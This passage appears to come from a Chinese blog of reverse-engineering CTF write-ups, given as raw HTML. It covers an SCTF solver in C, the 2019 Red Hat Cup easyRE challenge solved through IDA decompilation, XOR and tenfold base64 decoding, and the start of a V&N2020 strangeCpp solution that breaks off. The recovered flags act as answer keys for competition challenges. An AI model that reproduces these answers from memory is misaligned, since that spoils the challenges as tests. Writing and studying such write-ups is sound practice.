class="string">&quot;%x&quot;</span>%(i[-<span class="number">4</span>]))</span><br></pre></td></tr></table></figure><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;defs.h&quot;</span><span class="comment">//ida自带头文件，在IDA目录的plugins目录里</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> data1[<span class="number">288</span>] = &#123;</span><br><span class="line">    <span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>,</span><br><span class="line">    <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>,</span><br><span class="line">    <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x1C</span>, <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xBA</span>,</span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>,</span><br><span class="line">    <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xD1</span>, <span class="number">0xA2</span>,</span><br><span class="line">    <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>,</span><br><span class="line">    <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>,</span><br><span class="line">    <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>,</span><br><span class="line">    <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0xC0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>,</span><br><span class="line">    <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>,</span><br><span class="line">    <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0xC6</span>, <span class="number">0xBA</span>, <span class="number">0xB1</span>, <span class="number">0xA3</span>, <span class="number">0x50</span>, <span class="number">0x33</span>, <span class="number">0xAA</span>, <span class="number">0x56</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x91</span>, <span class="number">0x7D</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x70</span>, <span class="number">0xB2</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1;</span><br><span class="line">    v1 = (data1[BYTE2(a1)] &lt;&lt; <span class="number">16</span>) | data1[(<span class="keyword">unsigned</span> __int8)a1] | (data1[BYTE1(a1)] &lt;&lt; <span class="number">8</span>) | (data1[a1 &gt;&gt; <span class="number">24</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    <span class="keyword">return</span> __ROL4__(v1, <span class="number">12</span>) ^ (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(__ROL4__(v1, <span class="number">8</span>) ^ __ROR4__(v1, <span class="number">2</span>)) ^ __ROR4__(v1, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> data[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    data[<span class="number">26</span>] = <span class="number">0xBE040680</span>;</span><br><span class="line">    data[<span class="number">27</span>] = <span class="number">0xC5AF7647</span>;</span><br><span class="line">    data[<span class="number">28</span>] = <span class="number">0x9FCC401F</span>;</span><br><span class="line">    data[<span class="number">29</span>] = <span class="number">0xD8BF92EF</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">25</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        data[i] = fun(data[i + <span class="number">1</span>] ^ data[i + <span class="number">2</span>] ^ data[i + <span class="number">3</span>]) ^ data[i + <span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x %x %x %x\n&quot;</span>, data[<span class="number">0</span>], data[<span class="number">1</span>], data[<span class="number">2</span>], data[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>, ((<span class="keyword">char</span>*)&amp;data[i])[<span class="number">0</span>], ((<span class="keyword">char</span>*)&amp;data[i])[<span class="number">1</span>], ((<span class="keyword">char</span>*)&amp;data[i])[<span class="number">2</span>], ((<span class="keyword">char</span>*)&amp;data[i])[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到input3：fl4g_is_s0_ug1y!</p><p>得到最终flag：</p><blockquote><p>sctf{ddwwxxssxaxwwaasasyywwdd-c2N0Zl85MTAy(fl4g_is_s0_ug1y!)}</p></blockquote><h1 id="2019红帽杯easyRE"><a href="#2019红帽杯easyRE" class="headerlink" title="2019红帽杯easyRE"></a>2019红帽杯easyRE</h1><h2 id="关键词：算法"><a href="#关键词：算法" class="headerlink" title="关键词：算法"></a>关键词：算法</h2><p>首先IDA64打开，shift+f12搜索字符串，找看到ou found me！然后定位所在函数。</p><p>f5查看函数如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">sub_4009C6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">char</span> *v0; <span class="comment">// rsi</span></span><br><span class="line"> <span class="keyword">char</span> *v1; <span class="comment">// rdi</span></span><br><span class="line"> __int64 v2; <span class="comment">// rax</span></span><br><span class="line"> <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"> <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line"> __int64 v5; <span class="comment">// rax</span></span><br><span class="line"> __int64 v6; <span class="comment">// ST10_8</span></span><br><span class="line"> __int64 v7; <span class="comment">// ST18_8</span></span><br><span class="line"> __int64 v8; <span class="comment">// ST20_8</span></span><br><span class="line"> __int64 v9; <span class="comment">// ST28_8</span></span><br><span class="line"> __int64 v10; <span class="comment">// ST30_8</span></span><br><span class="line"> __int64 v11; <span class="comment">// ST38_8</span></span><br><span class="line"> __int64 v12; <span class="comment">// ST40_8</span></span><br><span class="line"> __int64 v13; <span class="comment">// ST48_8</span></span><br><span class="line"> __int64 v14; <span class="comment">// ST50_8</span></span><br><span class="line"> __int64 v15; <span class="comment">// ST58_8</span></span><br><span class="line"> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line"> <span class="keyword">char</span> v17; <span class="comment">// [rsp+60h] [rbp-C0h]</span></span><br><span class="line"> <span class="keyword">char</span> v18; <span class="comment">// [rsp+61h] [rbp-BFh]</span></span><br><span class="line"> <span class="keyword">char</span> v19; <span class="comment">// [rsp+62h] [rbp-BEh]</span></span><br><span class="line"> <span class="keyword">char</span> v20; <span class="comment">// [rsp+63h] [rbp-BDh]</span></span><br><span class="line"> <span class="keyword">char</span> v21; <span class="comment">// [rsp+64h] [rbp-BCh]</span></span><br><span class="line"> <span class="keyword">char</span> v22; <span class="comment">// [rsp+65h] [rbp-BBh]</span></span><br><span class="line"> <span class="keyword">char</span> v23; <span class="comment">// [rsp+66h] [rbp-BAh]</span></span><br><span class="line"> <span class="keyword">char</span> v24; <span class="comment">// [rsp+67h] [rbp-B9h]</span></span><br><span class="line"> <span class="keyword">char</span> v25; <span class="comment">// [rsp+68h] [rbp-B8h]</span></span><br><span class="line"> <span class="keyword">char</span> v26; <span class="comment">// [rsp+69h] [rbp-B7h]</span></span><br><span class="line"> <span class="keyword">char</span> v27; <span class="comment">// [rsp+6Ah] [rbp-B6h]</span></span><br><span class="line"> <span class="keyword">char</span> v28; <span class="comment">// [rsp+6Bh] [rbp-B5h]</span></span><br><span class="line"> <span class="keyword">char</span> v29; <span class="comment">// [rsp+6Ch] [rbp-B4h]</span></span><br><span class="line"> <span class="keyword">char</span> v30; <span class="comment">// [rsp+6Dh] [rbp-B3h]</span></span><br><span class="line"> <span class="keyword">char</span> v31; <span class="comment">// [rsp+6Eh] [rbp-B2h]</span></span><br><span class="line"> <span class="keyword">char</span> v32; <span class="comment">// [rsp+6Fh] [rbp-B1h]</span></span><br><span class="line"> <span class="keyword">char</span> v33; <span class="comment">// [rsp+70h] [rbp-B0h]</span></span><br><span class="line"> <span class="keyword">char</span> v34; <span class="comment">// [rsp+71h] [rbp-AFh]</span></span><br><span class="line"> <span class="keyword">char</span> v35; <span class="comment">// [rsp+72h] [rbp-AEh]</span></span><br><span class="line"> <span class="keyword">char</span> v36; <span class="comment">// [rsp+73h] [rbp-ADh]</span></span><br><span class="line"> <span class="keyword">char</span> v37; <span class="comment">// [rsp+74h] [rbp-ACh]</span></span><br><span class="line"> <span class="keyword">char</span> v38; <span class="comment">// [rsp+75h] [rbp-ABh]</span></span><br><span class="line"> <span class="keyword">char</span> v39; <span class="comment">// [rsp+76h] [rbp-AAh]</span></span><br><span class="line"> <span class="keyword">char</span> v40; <span class="comment">// [rsp+77h] [rbp-A9h]</span></span><br><span class="line"> <span class="keyword">char</span> v41; <span class="comment">// [rsp+78h] [rbp-A8h]</span></span><br><span class="line"> <span class="keyword">char</span> v42; <span class="comment">// [rsp+79h] [rbp-A7h]</span></span><br><span class="line"> <span class="keyword">char</span> v43; <span class="comment">// [rsp+7Ah] [rbp-A6h]</span></span><br><span class="line"> <span class="keyword">char</span> v44; <span class="comment">// [rsp+7Bh] [rbp-A5h]</span></span><br><span class="line"> <span class="keyword">char</span> v45; <span class="comment">// [rsp+7Ch] [rbp-A4h]</span></span><br><span class="line"> <span class="keyword">char</span> v46; <span class="comment">// [rsp+7Dh] [rbp-A3h]</span></span><br><span class="line"> <span class="keyword">char</span> v47; <span class="comment">// [rsp+7Eh] [rbp-A2h]</span></span><br><span class="line"> <span class="keyword">char</span> v48; <span class="comment">// [rsp+7Fh] [rbp-A1h]</span></span><br><span class="line"> <span class="keyword">char</span> v49; <span class="comment">// [rsp+80h] [rbp-A0h]</span></span><br><span class="line"> <span class="keyword">char</span> v50; <span class="comment">// [rsp+81h] [rbp-9Fh]</span></span><br><span class="line"> <span class="keyword">char</span> v51; <span class="comment">// [rsp+82h] [rbp-9Eh]</span></span><br><span class="line"> <span class="keyword">char</span> v52; <span class="comment">// [rsp+83h] [rbp-9Dh]</span></span><br><span class="line"> <span class="keyword">char</span> v53[<span class="number">32</span>]; <span class="comment">// [rsp+90h] [rbp-90h]</span></span><br><span class="line"> <span class="keyword">int</span> v54; <span class="comment">// [rsp+B0h] [rbp-70h]</span></span><br><span class="line"> <span class="keyword">char</span> v55; <span class="comment">// [rsp+B4h] [rbp-6Ch]</span></span><br><span class="line"> <span class="keyword">char</span> v56; <span class="comment">// [rsp+C0h] [rbp-60h]</span></span><br><span class="line"> <span class="keyword">char</span> v57; <span class="comment">// [rsp+E7h] [rbp-39h]</span></span><br><span class="line"> <span class="keyword">char</span> v58; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br><span class="line"> <span class="keyword">unsigned</span> __int64 v59; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line">​</span><br><span class="line"> v59 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"> v17 = <span class="number">73</span>;</span><br><span class="line"> v18 = <span class="number">111</span>;</span><br><span class="line"> v19 = <span class="number">100</span>;</span><br><span class="line"> v20 = <span class="number">108</span>;</span><br><span class="line"> v21 = <span class="number">62</span>;</span><br><span class="line"> v22 = <span class="number">81</span>;</span><br><span class="line"> v23 = <span class="number">110</span>;</span><br><span class="line"> v24 = <span class="number">98</span>;</span><br><span class="line"> v25 = <span class="number">40</span>;</span><br><span class="line"> v26 = <span class="number">111</span>;</span><br><span class="line"> v27 = <span class="number">99</span>;</span><br><span class="line"> v28 = <span class="number">121</span>;</span><br><span class="line"> v29 = <span class="number">127</span>;</span><br><span class="line"> v30 = <span class="number">121</span>;</span><br><span class="line"> v31 = <span class="number">46</span>;</span><br><span class="line"> v32 = <span class="number">105</span>;</span><br><span class="line"> v33 = <span class="number">127</span>;</span><br><span class="line"> v34 = <span class="number">100</span>;</span><br><span class="line"> v35 = <span class="number">96</span>;</span><br><span class="line"> v36 = <span class="number">51</span>;</span><br><span class="line"> v37 = <span class="number">119</span>;</span><br><span class="line"> v38 = <span class="number">125</span>;</span><br><span class="line"> v39 = <span class="number">119</span>;</span><br><span class="line"> v40 = <span class="number">101</span>;</span><br><span class="line"> v41 = <span class="number">107</span>;</span><br><span class="line"> v42 = <span class="number">57</span>;</span><br><span class="line"> v43 = <span class="number">123</span>;</span><br><span class="line"> v44 = <span class="number">105</span>;</span><br><span class="line"> v45 = <span class="number">121</span>;</span><br><span class="line"> v46 = <span class="number">61</span>;</span><br><span class="line"> v47 = <span class="number">126</span>;</span><br><span class="line"> v48 = <span class="number">121</span>;</span><br><span class="line"> v49 = <span class="number">76</span>;</span><br><span class="line"> v50 = <span class="number">64</span>;</span><br><span class="line"> v51 = <span class="number">69</span>;</span><br><span class="line"> v52 = <span class="number">67</span>;</span><br><span class="line"> <span class="built_in">memset</span>(v53, <span class="number">0</span>, <span class="keyword">sizeof</span>(v53));</span><br><span class="line"> v54 = <span class="number">0</span>;</span><br><span class="line"> v55 = <span class="number">0</span>;</span><br><span class="line"> v0 = v53;</span><br><span class="line"> sub_4406E0(<span class="number">0LL</span>, (__int64)v53);</span><br><span class="line"> v55 = <span class="number">0</span>;</span><br><span class="line"> v1 = v53;</span><br><span class="line"> LODWORD(v2) = sub_424BA0((<span class="keyword">const</span> __m128i *)v53);</span><br><span class="line"> <span class="keyword">if</span> ( v2 == <span class="number">36</span> )</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">     v1 = v53;</span><br><span class="line">     LODWORD(v4) = sub_424BA0((<span class="keyword">const</span> __m128i *)v53);</span><br><span class="line">     <span class="keyword">if</span> ( i &gt;= v4 )</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(v53[i] ^ i) != *(&amp;v17 + i) )</span><br><span class="line">    &#123;</span><br><span class="line">       result = <span class="number">4294967294LL</span>;</span><br><span class="line">       <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">   sub_410CC0(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">   <span class="built_in">memset</span>(&amp;v56, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">   v58 = <span class="number">0</span>;</span><br><span class="line">   v0 = &amp;v56;</span><br><span class="line">   sub_4406E0(<span class="number">0LL</span>, (__int64)&amp;v56);</span><br><span class="line">   v57 = <span class="number">0</span>;</span><br><span class="line">   v1 = &amp;v56;</span><br><span class="line">   LODWORD(v5) = sub_424BA0((<span class="keyword">const</span> __m128i *)&amp;v56);</span><br><span class="line">   <span class="keyword">if</span> ( v5 == <span class="number">39</span> )</span><br><span class="line">  &#123;</span><br><span class="line">     v6 = sub_400E44(&amp;v56);</span><br><span class="line">     v7 = sub_400E44(v6);</span><br><span class="line">     v8 = sub_400E44(v7);</span><br><span class="line">     v9 = sub_400E44(v8);</span><br><span class="line">     v10 = sub_400E44(v9);</span><br><span class="line">     v11 = sub_400E44(v10);</span><br><span class="line">     v12 = sub_400E44(v11);</span><br><span class="line">     v13 = sub_400E44(v12);</span><br><span class="line">     v14 = sub_400E44(v13);</span><br><span class="line">     v15 = sub_400E44(v14);</span><br><span class="line">     v0 = off_6CC090;</span><br><span class="line">     v1 = (<span class="keyword">char</span> *)v15;</span><br><span class="line">     <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400360(v15, off_6CC090) )</span><br><span class="line">    &#123;</span><br><span class="line">       sub_410CC0(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">       v1 = <span class="string">&quot;bye bye~&quot;</span>;</span><br><span class="line">       sub_410CC0(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">     result = <span class="number">4294967293LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br><span class="line">LABEL_13:</span><br><span class="line"> <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v59 )</span><br><span class="line">   sub_444020(v1, v0);</span><br><span class="line"> <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><p>f5反编译出来的代码可读性还是很高，我们来到关键代码处如下:</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304220814.png" alt="2019红帽杯easyRE001"></p><p>写脚本跑出来结果如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304220834.png" alt="2019红帽杯easyRE002"></p><h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>然后继续看下面的函数逻辑：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304220923.png" alt="2019红帽杯easyRE003"></p><p>点进去发现是base64加密，这里base64加密了10次，然后与字符串“Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ”</p><p>进行对比，那么我们将其字符串解密10次将其解密，写出脚本如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304220956.png" alt="2019红帽杯easyRE004"></p><p>一篇看雪的帖子我以为当中藏着flag信息，找了半天，好家伙，被耍了。没啥用。。。</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304221059.png" alt="2019红帽杯easyRE005"></p><h2 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h2><p>千辛万苦，找打base64加密数据下面的一些不连续数据被sub_400D35函数使用，</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304221126.png" alt="2019红帽杯easyRE006"></p><p>sub_400D35函数如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304221149.png" alt="2019红帽杯easyRE007"></p><p>关键代码</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304221224.png" alt="2019红帽杯easyRE008"></p><p>逆向写出脚本，运行得到flag</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304221257.png" alt="2019红帽杯easyRE009"></p><h1 id="V-amp-N2020-公开赛-strangeCpp"><a href="#V-amp-N2020-公开赛-strangeCpp" class="headerlink" title="[V&amp;N2020 公开赛]strangeCpp"></a>[V&amp;N2020 公开赛]strangeCpp</h1><h2 id="关键词：md5"><a href="#关键词：md5" class="headerlink" title="关键词：md5"></a>关键词：md5</h2><p>无壳，拖入ida，查找字符串定位到关键函数如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304221728.png" alt="[V&amp;N2020 公开赛]strangeCpp001"></p><p>从上图可以看到，140021007和140021019之间有一部分数据，unk_140021008，如下：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304221744.png" alt="[V&amp;N2020 公开赛]strangeCpp002"></p><p>交叉引用来到关键函数：</p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304221826.png" alt="[V&amp;N2020 公开赛]strangeCpp003"></p><p><img src="https://thhao0501.oss-cn-hongkong.aliyuncs.com/img/others/20210304221842.png" alt="[V&amp;N2020 公开赛]strangeCpp004"></p><p>result == 607052314且dword_140021190 &lt;= 14549743</p><p>所以经过sub_140011384操作过后的值等于607052314</p><p>我们算这个v7=607052314 我们要通过v7来推v8</p><p>v8解出来之后和qword_140021008数组异或，得到flag</p><h2 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">table = [</span><br><span class="line">    <span class="number">0x26</span>, <span class="number">0x2C</span>, <span class="number">0x21</span>, <span class="number">0x27</span>, <span class="number">0x3B</span>, <span class="number">0x0D</span>, <span class="number">0x4</span>, <span class="number">0x75</span>, <span class="number">0x68</span>, <span class="number">0x34</span>, <span class="number">0x28</span>, <span class="number">0x25</span>,</span><br><span class="line">    <span class="number">0x0E</span>, <span class="number">0x35</span>, <span class="number">0x2D</span>, <span class="number">0x69</span>, <span class="number">0x3D</span></span><br><span class="line">]</span><br><span class="line">flag0 = <span 